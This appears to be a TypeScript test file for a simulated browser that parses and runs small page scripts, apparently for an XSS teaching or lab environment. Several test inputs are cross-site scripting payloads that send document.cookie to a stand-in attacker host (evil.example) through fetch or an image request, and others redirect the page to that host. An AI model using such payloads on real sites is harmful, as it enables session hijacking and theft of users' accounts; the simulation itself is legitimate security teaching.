import { describe, expect, it } from 'vitest';
import { parsePageScript, runPageScript, type Statement } from './pageScript';
import { response } from './http';
import { createWorld } from './world';
import type { Site } from './site';

const ORIGIN = 'https://shop.example';
const HREF = `${ORIGIN}/search`;

const sink = (party: Site['party'], origin: string): Site => ({
  origin,
  party,
  routes: [
    { method: 'GET', path: '/', handler: () => response(200, 'home') },
    { method: 'GET', path: '/c', handler: () => response(200, 'thanks') },
  ],
});

function setup() {
  const world = createWorld([sink('shop', ORIGIN), sink('evil', 'https://evil.example')]);
  const run = (text: string) => {
    const parsed = parsePageScript(text);
    if (!parsed.ok) throw new Error(parsed.why);
    return runPageScript(parsed.statements, ORIGIN, world.browser, HREF);
  };
  return { world, run };
}

const statements = (text: string): Statement[] => {
  const parsed = parsePageScript(text);
  if (!parsed.ok) throw new Error(parsed.why);
  return parsed.statements;
};

describe('parsePageScript', () => {
  it.each<[string, Statement]>([
    ['alert(1)', { kind: 'alert', value: [{ text: '1' }] }],
    ["alert('x')", { kind: 'alert', value: [{ text: 'x' }] }],
    ['alert("x")', { kind: 'alert', value: [{ text: 'x' }] }],
    ["console.log('x')", { kind: 'log', value: [{ text: 'x' }] }],
    ["fetch('https://evil.example/c?' + document.cookie)", { kind: 'fetch', value: [{ text: 'https://evil.example/c?' }, { read: 'cookie' }] }],
    ["location = 'https://evil.example'", { kind: 'navigate', value: [{ text: 'https://evil.example' }] }],
    ["location.href = 'x'", { kind: 'navigate', value: [{ text: 'x' }] }],
    ["document.location = 'x'", { kind: 'navigate', value: [{ text: 'x' }] }],
    ["new Image().src = 'x' + document.cookie", { kind: 'image', value: [{ text: 'x' }, { read: 'cookie' }] }],
    ['alert(location.href)', { kind: 'alert', value: [{ read: 'href' }] }],
  ])('reads %s', (text, statement) => {
    expect(statements(text)).toEqual([statement]);
  });

  it('reads two joined by a semicolon, with spare spaces and a trailing one', () => {
    expect(statements(" alert(1) ;  console.log( 'x' ) ; ").map((s) => s.kind)).toEqual(['alert', 'log']);
  });

  it('keeps a semicolon and a quote that sit inside quoted text', () => {
    expect(statements(`alert('a;b"c')`)).toEqual([{ kind: 'alert', value: [{ text: 'a;b"c' }] }]);
  });

  it.each(['eval(\'x\')', 'window.alert(1)', 'alert(', 'alert(1', "alert('x)", '', '   ', ';', 'alert()', 'alert(1) alert(2)', 'alert(1 +)', 'fetch(x)', 'location'])('refuses %j and names what it understands', (text) => {
    const parsed = parsePageScript(text);
    expect(parsed.ok).toBe(false);
    if (!parsed.ok) expect(parsed.why).toContain('alert');
  });
});

describe('runPageScript', () => {
  it('describes an alert, with no real dialog', () => {
    expect(setup().run('alert(1)')).toEqual(['alert("1")']);
  });

  it('reads the cookies a script may see', () => {
    const { world, run } = setup();
    world.browser.plant(ORIGIN, { name: 'sid', value: 'abc' });
    expect(run('alert(document.cookie)')).toEqual(['alert("sid=abc")']);
  });

  it('reads nothing from an HttpOnly cookie', () => {
    const { world, run } = setup();
    world.browser.plant(ORIGIN, { name: 'sid', value: 'abc', httpOnly: true });
    expect(run('alert(document.cookie)')).toEqual(['alert("")']);
  });

  it('reads the address', () => {
    expect(setup().run('alert(location.href)')).toEqual([`alert("${HREF}")`]);
  });

  it('sends a fetch to a simulated site, with no cookies', () => {
    const { world, run } = setup();
    world.browser.plant('https://evil.example', { name: 'other', value: '1' });
    expect(run("fetch('https://evil.example/c?x=1')")).toEqual(['sent a request to https://evil.example/c?x=1']);
    expect(world.events.at(-1)!.to).toBe('evil');
    expect(world.events.at(-1)!.request.headers.cookie).toBeUndefined();
  });

  it('sends cookies with a fetch to its own origin, as fetch does by default', () => {
    const { world, run } = setup();
    world.browser.plant(ORIGIN, { name: 'sid', value: 'abc', httpOnly: true });
    run("fetch('/c')");
    expect(world.events.at(-1)!.request.headers.cookie).toBe('sid=abc');
  });

  it('sends an image request as a subresource', () => {
    const { world, run } = setup();
    expect(run("new Image().src = 'https://evil.example/c?x=1'")).toEqual(['sent a request to https://evil.example/c?x=1']);
    expect(world.events.at(-1)!.request.headers.origin).toBeUndefined();
  });

  it('moves the page', () => {
    const { world, run } = setup();
    expect(run("location = 'https://evil.example/'")).toEqual(['moved the page to https://evil.example/']);
    expect(world.events.at(-1)!.to).toBe('evil');
  });

  it('resolves a path against the page', () => {
    const { world, run } = setup();
    run("fetch('/c')");
    expect(world.events.at(-1)!.request.url).toBe(`${ORIGIN}/c`);
  });

  it.each(["fetch('https://real-site.com/')", "new Image().src = 'https://real-site.com/'", "location = 'https://real-site.com/'", "fetch('not a url')"])('records a network error for %s', (text) => {
    const { world, run } = setup();
    expect(run(text)[0]).toContain('no such host');
    expect(world.events.at(-1)!.to).toBeNull();
  });
});
